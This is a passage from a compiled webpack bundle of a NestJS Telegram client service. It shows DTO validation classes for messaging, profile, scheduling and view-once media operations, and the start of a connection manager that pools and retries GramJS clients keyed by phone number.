    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "text", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Photo message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "photo", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Video message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "video", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Voice message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "voice", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Document message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "document", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Round video message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "roundVideo", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Round voice message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "roundVoice", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/metadata-operations.dto.ts":
/*!****************************************************************!*\
  !*** ./src/components/Telegram/dto/metadata-operations.dto.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BulkMessageOperationDto = exports.DialogsQueryDto = exports.MediaMetadataDto = exports.MetadataType = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var MetadataType;
(function (MetadataType) {
    MetadataType["PHOTO"] = "photo";
    MetadataType["VIDEO"] = "video";
    MetadataType["DOCUMENT"] = "document";
})(MetadataType || (exports.MetadataType = MetadataType = {}));
class MediaMetadataDto {
    constructor() {
        this.limit = 50;
    }
}
exports.MediaMetadataDto = MediaMetadataDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID to get metadata from' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], MediaMetadataDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message offset', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], MediaMetadataDto.prototype, "offset", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Maximum number of items', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], MediaMetadataDto.prototype, "limit", void 0);
class DialogsQueryDto {
    constructor() {
        this.limit = 100;
        this.offsetId = 0;
        this.archived = false;
    }
}
exports.DialogsQueryDto = DialogsQueryDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of dialogs to fetch', required: false, type: Number, minimum: 1, maximum: 1000 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(1),
    (0, class_validator_1.Max)(1000),
    __metadata("design:type", Number)
], DialogsQueryDto.prototype, "limit", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Dialog offset', required: false, type: Number, minimum: 0 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    __metadata("design:type", Number)
], DialogsQueryDto.prototype, "offsetId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Include archived chats', required: false, type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => {
        if (value === 'true')
            return true;
        if (value === 'false')
            return false;
        return value;
    }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], DialogsQueryDto.prototype, "archived", void 0);
class BulkMessageOperationDto {
}
exports.BulkMessageOperationDto = BulkMessageOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID', type: String, minLength: 1, maxLength: 255 }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BulkMessageOperationDto.prototype, "fromChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Target chat ID', type: String, minLength: 1, maxLength: 255 }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BulkMessageOperationDto.prototype, "toChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message IDs to operate on', type: [Number], minItems: 1, maxItems: 100 }),
    (0, class_transformer_1.Transform)(({ value }) => Array.isArray(value) ? value.map(Number) : value),
    __metadata("design:type", Array)
], BulkMessageOperationDto.prototype, "messageIds", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/profile-settings.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/profile-settings.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ProfilePhotoDto = exports.SecuritySettingsDto = exports.PrivacySettingsDto = exports.UpdateProfileDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const telegram_1 = __webpack_require__(/*! ../../../interfaces/telegram */ "./src/interfaces/telegram.ts");
class UpdateProfileDto {
}
exports.UpdateProfileDto = UpdateProfileDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'First name' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], UpdateProfileDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'About/bio information', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], UpdateProfileDto.prototype, "about", void 0);
class PrivacySettingsDto {
}
exports.PrivacySettingsDto = PrivacySettingsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Phone number visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "phoneNumber", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last seen visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "lastSeen", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Profile photos visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "profilePhotos", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message forwards visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "forwards", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Calls privacy', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Group chats privacy', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "groups", void 0);
class SecuritySettingsDto {
}
exports.SecuritySettingsDto = SecuritySettingsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Enable/disable two-factor authentication' }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SecuritySettingsDto.prototype, "twoFactorAuth", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Active sessions limit', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)([1, 2, 3, 4, 5]),
    __metadata("design:type", Number)
], SecuritySettingsDto.prototype, "activeSessionsLimit", void 0);
class ProfilePhotoDto {
}
exports.ProfilePhotoDto = ProfilePhotoDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name/identifier of the photo to set' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ProfilePhotoDto.prototype, "name", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/schedule-operations.dto.ts":
/*!****************************************************************!*\
  !*** ./src/components/Telegram/dto/schedule-operations.dto.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BatchProcessItemDto = exports.RescheduleMessageDto = exports.DeleteScheduledMessageDto = exports.GetScheduledMessagesDto = exports.ScheduleMessageDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const batch_operations_dto_1 = __webpack_require__(/*! ./batch-operations.dto */ "./src/components/Telegram/dto/batch-operations.dto.ts");
class ScheduleMessageDto extends batch_operations_dto_1.BaseBatchItemDto {
}
exports.ScheduleMessageDto = ScheduleMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message content' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ScheduleMessageDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Date to schedule the message' }),
    (0, class_validator_1.IsDateString)(),
    (0, class_transformer_1.Transform)(({ value }) => new Date(value)),
    __metadata("design:type", String)
], ScheduleMessageDto.prototype, "scheduledTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message to reply to', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], ScheduleMessageDto.prototype, "replyTo", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Silent notification', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ScheduleMessageDto.prototype, "silent", void 0);
class GetScheduledMessagesDto extends batch_operations_dto_1.BaseBatchItemDto {
    constructor() {
        super(...arguments);
        this.limit = 50;
    }
}
exports.GetScheduledMessagesDto = GetScheduledMessagesDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Maximum number of messages to return', required: false, default: 50 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], GetScheduledMessagesDto.prototype, "limit", void 0);
class DeleteScheduledMessageDto extends batch_operations_dto_1.BaseBatchItemDto {
}
exports.DeleteScheduledMessageDto = DeleteScheduledMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'ID of the scheduled message to delete' }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], DeleteScheduledMessageDto.prototype, "messageId", void 0);
class RescheduleMessageDto {
}
exports.RescheduleMessageDto = RescheduleMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID containing the message' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], RescheduleMessageDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message ID to reschedule' }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], RescheduleMessageDto.prototype, "messageId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'New schedule date (ISO string)' }),
    (0, class_validator_1.IsDateString)(),
    __metadata("design:type", String)
], RescheduleMessageDto.prototype, "newScheduleDate", void 0);
class BatchProcessItemDto {
}
exports.BatchProcessItemDto = BatchProcessItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID or message ID depending on operation' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BatchProcessItemDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message ID for operations that require it', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchProcessItemDto.prototype, "messageId", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/send-message.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/Telegram/dto/send-message.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SendMessageDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SendMessageDto {
}
exports.SendMessageDto = SendMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Target username or peer ID',
        example: 'someusername',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMessageDto.prototype, "peer", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Message text to send',
        example: 'Hello from NestJS and GramJS!',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMessageDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional message parse mode (Markdown, HTML)',
        required: false,
        example: 'Markdown',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMessageDto.prototype, "parseMode", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/update-username.dto.ts":
/*!************************************************************!*\
  !*** ./src/components/Telegram/dto/update-username.dto.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUsernameDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class UpdateUsernameDto {
}
exports.UpdateUsernameDto = UpdateUsernameDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'New username to set for the Telegram user',
        example: 'new_username123',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], UpdateUsernameDto.prototype, "newUsername", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/view-once-media.dto.ts":
/*!************************************************************!*\
  !*** ./src/components/Telegram/dto/view-once-media.dto.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ViewOnceMediaDto = exports.MediaSourceType = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
var MediaSourceType;
(function (MediaSourceType) {
    MediaSourceType["PATH"] = "path";
    MediaSourceType["BASE64"] = "base64";
    MediaSourceType["BINARY"] = "binary";
})(MediaSourceType || (exports.MediaSourceType = MediaSourceType = {}));
class ViewOnceMediaDto {
}
exports.ViewOnceMediaDto = ViewOnceMediaDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Chat ID to send the view once media to',
        example: '123456789'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Source type of the media: url, base64, or binary',
        enum: MediaSourceType,
        example: 'url'
    }),
    (0, class_validator_1.IsEnum)(MediaSourceType),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "sourceType", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'URL of the media file (when sourceType is url)',
        required: false,
        example: 'https://example.com/image.jpg'
    }),
    (0, class_validator_1.ValidateIf)(o => o.sourceType === MediaSourceType.PATH),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "path", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Base64 encoded media data (when sourceType is base64)',
        required: false,
        example: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD...'
    }),
    (0, class_validator_1.ValidateIf)(o => o.sourceType === MediaSourceType.BASE64),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "base64Data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Binary media data (when sourceType is binary)',
        required: false,
        type: 'string',
        format: 'binary'
    }),
    (0, class_validator_1.ValidateIf)(o => o.sourceType === MediaSourceType.BINARY),
    __metadata("design:type", Object)
], ViewOnceMediaDto.prototype, "binaryData", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional caption for the media',
        required: false,
        example: 'Check this out! It will disappear after viewing'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "caption", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional filename for the media',
        required: false,
        example: 'secret_image.jpg'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "filename", void 0);


/***/ }),

/***/ "./src/components/Telegram/utils/connection-manager.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/utils/connection-manager.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.connectionManager = void 0;
const TelegramManager_1 = __importDefault(__webpack_require__(/*! ../TelegramManager */ "./src/components/Telegram/TelegramManager.ts"));
const parseError_1 = __webpack_require__(/*! ../../../utils/parseError */ "./src/utils/parseError.ts");
const telegram_logger_1 = __webpack_require__(/*! ./telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const utils_1 = __webpack_require__(/*! ../../../utils */ "./src/utils/index.ts");
const TelegramBots_config_1 = __webpack_require__(/*! ../../../utils/TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
class ConnectionManager {
    constructor() {
        this.cleanupInterval = null;
        this.usersService = null;
        this.isShuttingDown = false;
        this.DEFAULT_RETRY_CONFIG = {
            maxAttempts: 5,
            baseDelay: 1000,
            maxDelay: 30000,
            backoffMultiplier: 2,
            jitter: true
        };
        this.CONNECTION_TIMEOUT = 60000;
        this.MAX_CONCURRENT_CONNECTIONS = 100;
        this.COOLDOWN_PERIOD = 600000;
        this.VALIDATION_TIMEOUT = 10000;
        this.CLEANUP_TIMEOUT = 15000;
        this.MAX_CLEANUP_ATTEMPTS = 3;
        this.clients = new Map();
        this.logger = telegram_logger_1.TelegramLogger.getInstance();
        this.boundShutdownHandler = this.handleShutdown.bind(this);
        process.on('SIGTERM', this.boundShutdownHandler);
        process.on('SIGINT', this.boundShutdownHandler);
        this.startCleanupInterval();
    }
    setUsersService(usersService) {
        this.usersService = usersService;
    }
    static getInstance() {
        if (!ConnectionManager.instance) {
            ConnectionManager.instance = new ConnectionManager();
        }
        return ConnectionManager.instance;
    }
    dispose() {
        this.isShuttingDown = true;
        this.stopCleanupInterval();
        process.off('SIGTERM', this.boundShutdownHandler);
        process.off('SIGINT', this.boundShutdownHandler);
    }
    async handleShutdown() {
        this.logger.logOperation('ConnectionManager', 'Graceful shutdown initiated');
        this.dispose();
        await this.disconnectAll();
        process.exit(0);
    }
    createTimeoutPromise(timeoutMs, signal) {
        return new Promise((_, reject) => {
            const timeoutId = setTimeout(() => {
                reject(new Error('Operation timeout'));
            }, timeoutMs);
            if (signal) {
                signal.addEventListener('abort', () => {
                    clearTimeout(timeoutId);
                    reject(new Error('Operation aborted'));
                }, { once: true });
            }
        });
    }
    calculateRetryDelay(attempt, config) {
        let delay = Math.min(config.baseDelay * Math.pow(config.backoffMultiplier, attempt), config.maxDelay);
        if (config.jitter) {
            delay = delay * (0.5 + Math.random() * 0.5);
        }
        return Math.floor(delay);
    }
    shouldRetry(clientInfo, error) {
        const now = Date.now();
        if (clientInfo.connectionAttempts >= clientInfo.retryConfig.maxAttempts) {
            return false;
        }
        if (clientInfo.nextRetryAt && now < clientInfo.nextRetryAt) {
            return false;
        }
        const errorMessage = error.toLowerCase();
        const nonRetryableErrors = [
            'user_deactivated_ban',
            'auth_key_unregistered',
            'session_revoked',
            'phone_number_banned',
            'user_deactivated'
        ];
        if (nonRetryableErrors.some(errType => errorMessage.includes(errType))) {
            this.logger.logOperation(clientInfo.client?.phoneNumber || 'unknown', `Non-retryable error detected: ${error}`);
            return false;
        }
        return true;
    }
    async waitForRetry(clientInfo) {
        if (!clientInfo.nextRetryAt)
            return;
        const now = Date.now();
        const waitTime = Math.max(0, clientInfo.nextRetryAt - now);
        if (waitTime > 0) {
            this.logger.logOperation(clientInfo.client?.phoneNumber || 'unknown', `Waiting ${waitTime}ms before retry attempt ${clientInfo.connectionAttempts + 1}`);
            await new Promise(resolve => setTimeout(resolve, waitTime));
        }
    }
    async validateConnection(mobile, client) {
        try {
            if (!client.connected()) {
                return false;
            }
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), this.VALIDATION_TIMEOUT);
            try {
                await Promise.race([
                    client.client.getMe(),
                    this.createTimeoutPromise(this.VALIDATION_TIMEOUT, controller.signal)
                ]);
                return true;
            }
            finally {
                clearTimeout(timeoutId);
                controller.abort();
            }
        }
        catch (error) {
            this.logger.logError(mobile, 'Connection validation failed', error);
            return false;
        }
    }
    async getClient(mobile, options = {}) {
        if (!mobile) {
            throw new common_1.BadRequestException('Mobile number is required');
        }
        if (this.isShuttingDown) {
            throw new common_1.InternalServerErrorException('ConnectionManager is shutting down');
        }
        if (this.clients.size >= this.MAX_CONCURRENT_CONNECTIONS) {
            throw new common_1.InternalServerErrorException('Maximum connection limit reached');
        }
        const { autoDisconnect = true, handler = true, timeout = this.CONNECTION_TIMEOUT, retryConfig = {}, forceReconnect = false } = options;
        const mergedRetryConfig = {
            ...this.DEFAULT_RETRY_CONFIG,
            ...retryConfig
        };
        let clientInfo = this.clients.get(mobile);
        if (clientInfo?.client) {
            const isValid = await this.validateConnection(mobile, clientInfo.client);
            const isHealthy = clientInfo.state === 'connected' &&
                clientInfo.consecutiveFailures === 0 &&
                (Date.now() - clientInfo.lastSuccessfulConnection) < this.CONNECTION_TIMEOUT;
            if (!forceReconnect && isValid && isHealthy) {
                this.updateLastUsed(mobile);
                this.logger.logOperation(mobile, 'Reusing validated healthy client');
                return clientInfo.client;
            }
            this.logger.logOperation(mobile, `Cleaning up client - Valid: ${isValid}, Healthy: ${isHealthy}, ForceReconnect: ${forceReconnect}`);
            await this.unregisterClient(mobile);
            clientInfo = undefined;
        }
        if (clientInfo) {
            this.logger.logOperation(mobile, 'Client info found but not valid, cleaning up');
            await this.unregisterClient(mobile);
            await (0, utils_1.sleep)(1000);
        }
        this.logger.logOperation(mobile, 'Creating fresh client connection');
        return this.createNewClient(mobile, mergedRetryConfig, { autoDisconnect, handler, timeout });
    }
    async retryConnection(mobile, clientInfo, timeout) {
        try {
            clientInfo.state = 'connecting';
            clientInfo.connectionAttempts++;
            this.clients.set(mobile, clientInfo);
            this.logger.logOperation(mobile, `Retry attempt ${clientInfo.connectionAttempts}/${clientInfo.retryConfig.maxAttempts}`);
            await Promise.race([
                clientInfo.client.connect(),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Reconnection timeout')), timeout))
            ]);
            if (await this.validateConnection(mobile, clientInfo.client)) {
                clientInfo.state = 'connected';
                clientInfo.consecutiveFailures = 0;
                clientInfo.lastSuccessfulConnection = Date.now();
